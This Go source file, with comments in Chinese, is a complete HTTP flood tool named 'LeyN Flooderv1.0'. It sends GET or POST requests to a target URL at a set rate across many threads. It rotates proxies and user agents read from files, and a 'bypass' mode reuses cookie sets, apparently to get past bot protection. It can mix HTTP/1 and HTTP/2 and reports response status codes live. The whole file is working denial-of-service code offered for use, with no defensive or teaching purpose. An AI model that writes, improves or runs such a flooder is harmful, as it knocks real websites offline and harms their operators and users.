package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
	"golang.org/x/net/http2"
)

var (
	successCount int64
	statusCode   = make(map[int]int)
	mu           sync.Mutex
	reset        = "\033[0m"
	yellow       = "\033[33m"
	green        = "\033[32m"
)

type RequestInfo struct {
	Proxy  string
	UA     string
	Cookie string
}

func main() {
	initLogger()

	// 更新后的命令行参数格式：./flooder method URL时间 速率(每线程) 线程数 http_version (1/2/mix) mode
	if len(os.Args) != 8 {
		fmt.Println("Usage: ./program mode(GET/POST) URL duration(seconds) rate(req/sec) threads version(1/2/mix) method(flood/bypass)")
		return
	}

	method := os.Args[1]                    // 请求方式 GET/POST
	target := os.Args[2]                    // 目标 URL
	duration, _ := strconv.Atoi(os.Args[3]) // 持续时间
	rate, _ := strconv.Atoi(os.Args[4])     // 每线程请求速率
	threads, _ := strconv.Atoi(os.Args[5])  // 线程数
	httpVer := os.Args[6]                   // HTTP版本 1/2/mix
	mode := os.Args[7]                      // 模式，支持不同的模式（如 flood 或其他）

	fmt.Printf("%s[INFO] - LeyN Flooderv1.0%s\n", green, reset)

	title := getTitle(target)
	load := getLoad(mode)

	boxContent := []string{
		fmt.Sprintf("Title : %s", title),
		fmt.Sprintf("Load  : %d", load),
		fmt.Sprintf("Method: %s / %s", mode, method),
	}
	printBox(boxContent)

	fmt.Printf("\n%s[INFO] Flooder Running%s\n", green, reset)

	var requests []RequestInfo
	// 读取代理和用户代理信息
	if mode == "flood" {
		proxies := readLines("proxy.txt")
		uas := readLines("ua.txt")
		for _, p := range proxies {
			requests = append(requests, RequestInfo{Proxy: p, UA: uas[rand.Intn(len(uas))]})
		}
	} else {
		lines := readLines("config.txt")
		for _, line := range lines {
			parts := strings.SplitN(line, " ", 3)
			if len(parts) == 3 {
				requests = append(requests, RequestInfo{Proxy: parts[0], UA: parts[1], Cookie: parts[2]})
			}
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			tick := time.NewTicker(time.Second / time.Duration(rate))
			defer tick.Stop()

			for {
				select {
				case <-ctx.Done():
					return
				case <-tick.C:
					reqInfo := requests[rand.Intn(len(requests))]
					// 如果是 mix 模式，随机选择 HTTP/1 或 HTTP/2
					if httpVer == "mix" {
						if rand.Intn(2) == 0 {
							go sendRequest(target, method, reqInfo, "1") // 使用 HTTP/1
						} else {
							go sendRequest(target, method, reqInfo, "2") // 使用 HTTP/2
						}
					} else {
						go sendRequest(target, method, reqInfo, httpVer) // 使用指定的 HTTP 版本
					}
				}
			}
		}()
	}

	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				mu.Lock()

				// 收集并排序状态码
				var codes []int
				for code := range statusCode {
					codes = append(codes, code)
				}
				sort.Ints(codes)

				// 打印排序后的状态码和数量
				fmt.Printf("\r%s[Status] - {", yellow)
				for _, code := range codes {
					fmt.Printf("%d - %d ", code, statusCode[code])
				}
				fmt.Printf("}%s", reset)

				mu.Unlock()
				time.Sleep(1 * time.Second)
			}
		}
	}()

	wg.Wait()
}

func sendRequest(targetURL, method string, info RequestInfo, httpVer string) {
	// 创建代理 URL
	proxyURL := http.ProxyURL(&url.URL{
		Scheme: "http", // 如果你有 SOCKS5 代理，可以设置为 "socks5"
		Host:   info.Proxy,
	})

	// 使用代理
	tr := &http.Transport{
		Proxy:           proxyURL,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: tr,
	}

	if httpVer == "2" {
		http2.ConfigureTransport(tr)
	}

	// 创建请求
	req, err := http.NewRequest(method, targetURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", info.UA)
	if info.Cookie != "" {
		req.Header.Set("Cookie", info.Cookie)
	}

	// 执行请求
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// 记录成功的请求
	mu.Lock()
	successCount++
	statusCode[resp.StatusCode]++
	mu.Unlock()
}

func readLines(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatal().Err(err).Str("file", path).Msg("failed to read file")
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			lines = append(lines, text)
		}
	}
	return lines
}

func getTitle(url string) string {
	resp, err := http.Get(url)
	if err != nil {
		log.Warn().Err(err).Str("url", url).Msg("failed to get title")
		return "Unknown"
	}
	defer resp.Body.Close()

	buf := make([]byte, 4096)
	n, _ := resp.Body.Read(buf)
	body := string(buf[:n])
	start := strings.Index(body, "<title>")
	end := strings.Index(body, "</title>")
	if start != -1 && end != -1 && end > start {
		return body[start+7 : end]
	}
	return "No Title"
}

func getLoad(mode string) int {
	if mode == "flood" {
		return len(readLines("proxy.txt"))
	}
	return len(readLines("config.txt"))
}

func initLogger() {
	logFile, err := os.OpenFile("output.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		fmt.Println("Failed to open log file:", err)
		os.Exit(1)
	}

	consoleWriter := zerolog.ConsoleWriter{Out: os.Stdout, TimeFormat: "15:04:05"}
	multi := io.MultiWriter(consoleWriter, logFile)
	log.Logger = zerolog.New(multi).With().Timestamp().Logger()
}

func printBox(lines []string) {
	// 计算最长行宽
	maxLen := 0
	for _, line := range lines {
		if len(line) > maxLen {
			maxLen = len(line)
		}
	}

	// 打印顶部边框
	fmt.Printf("┌%s┐\n", strings.Repeat("─", maxLen+2))

	// 打印内容行
	for _, line := range lines {
		padding := maxLen - len(line)
		fmt.Printf("│ %s%s │\n", line, strings.Repeat(" ", padding))
	}

	// 打印底部边框
	fmt.Printf("└%s┘\n", strings.Repeat("─", maxLen+2))
}
